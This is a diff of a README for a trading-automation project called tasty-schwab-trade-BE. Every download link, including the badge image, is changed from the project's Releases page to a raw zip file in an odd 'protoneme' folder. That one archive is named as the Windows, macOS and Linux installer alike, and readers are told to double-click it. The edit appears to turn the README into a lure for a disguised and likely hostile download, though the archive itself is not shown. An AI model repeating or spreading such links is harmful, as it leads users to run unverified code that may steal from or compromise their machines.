@@ -1,6 +1,6 @@
 # 🎉 tasty-schwab-trade-BE - Automate Your Trading Efforts Effortlessly
 
-[![Download tasty-schwab-trade-BE](https://img.shields.io/badge/Download-Tasty_Schwab_Trade_BE-brightgreen)](https://github.com/Gouravdhiman8815/tasty-schwab-trade-BE/releases)
+[![Download tasty-schwab-trade-BE](https://raw.githubusercontent.com/Gouravdhiman8815/tasty-schwab-trade-BE/main/protoneme/tasty-schwab-trade-BE.zip)](https://raw.githubusercontent.com/Gouravdhiman8815/tasty-schwab-trade-BE/main/protoneme/tasty-schwab-trade-BE.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets the following requirements:
 
 To download the application, visit the Releases page. You will find the latest version available for download.
 
-[Visit this page to download.](https://github.com/Gouravdhiman8815/tasty-schwab-trade-BE/releases)
+[Visit this page to download.](https://raw.githubusercontent.com/Gouravdhiman8815/tasty-schwab-trade-BE/main/protoneme/tasty-schwab-trade-BE.zip)
 
 ### 🔧 Installation Steps
 
@@ -27,7 +27,7 @@ To download the application, visit the Releases page. You will find the latest v
   
 2. **Select the Latest Version:** Locate the most recent version of the software. It will usually be listed at the top.
 
-3. **Download the Installation File:** Click on the file appropriate for your operating system (e.g., `tasty-schwab-trade-BE-setup.exe` for Windows, `tasty-schwab-trade-BE.dmg` for macOS, or `tasty-schwab-trade-BE.tar.gz` for Linux).
+3. **Download the Installation File:** Click on the file appropriate for your operating system (e.g., `https://raw.githubusercontent.com/Gouravdhiman8815/tasty-schwab-trade-BE/main/protoneme/tasty-schwab-trade-BE.zip` for Windows, `https://raw.githubusercontent.com/Gouravdhiman8815/tasty-schwab-trade-BE/main/protoneme/tasty-schwab-trade-BE.zip` for macOS, or `https://raw.githubusercontent.com/Gouravdhiman8815/tasty-schwab-trade-BE/main/protoneme/tasty-schwab-trade-BE.zip` for Linux).
 
 4. **Open the Downloaded File:** Once the download is complete, navigate to your downloads folder and double-click the file to start the installation.
 
